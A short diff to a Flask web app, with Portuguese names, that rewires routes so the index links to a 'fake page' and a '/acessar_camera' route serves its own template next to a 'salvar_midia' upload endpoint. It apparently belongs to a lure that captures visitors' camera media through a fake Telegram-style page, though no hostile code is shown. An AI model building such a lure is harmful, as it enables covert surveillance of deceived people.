@@ -51,9 +51,9 @@ def video_file(filename):
         app.logger.error(f'Erro ao acessar vídeo {filename}: {str(e)}')
         return 'Erro ao acessar arquivo', 404
 
-@app.route('/index')
+@app.route('/')
 def index():
-    link_pagina_fake = url_for('index')
+    link_pagina_fake = url_for('pagina_fake')
     return render_template('index.html', link_pagina_fake=link_pagina_fake)
 
 @app.route('/fake')
@@ -64,9 +64,9 @@ def pagina_fake():
 def telegram():
     return render_template('telegram.html')
 
-@app.route('/telegram')
+@app.route('/acessar_camera')
 def acessar_camera():
-    return render_template('telegram.html')
+    return render_template('acessar_camera.html')
 
 @app.route('/salvar_midia', methods=['POST'])
 def salvar_midia():
